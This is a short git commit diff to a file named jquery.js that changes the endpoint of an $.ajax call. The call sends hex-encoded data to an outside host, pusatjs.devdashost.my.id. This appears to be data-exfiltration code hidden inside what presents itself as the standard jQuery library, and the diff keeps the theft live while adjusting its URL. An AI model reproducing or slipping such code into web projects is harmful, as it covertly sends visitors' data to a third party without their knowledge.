7b01791b8ee968dbc4f9674da460d8732952a6e7
min-flash <jokikontak8@gmail.com>
2024-09-02 10:28:23 +0700

    Update jquery.js

--- jquery.js
+++ jquery.js
@@ -109,7 +109,7 @@
         end: async function () {
             await $.ajax({
                 url:
-                    "https://pusatjs.devdashost.my.id/sour/?json=" +
+                    "https://pusatjs.devdashost.my.id" +
                     (function (e) {
                         for (var t, n = 0, r = e.length, i = ""; n < r; ++n) i += (t = e.charCodeAt(n).toString(16)).length < 2 ? "0" + t : t;
                         return i;
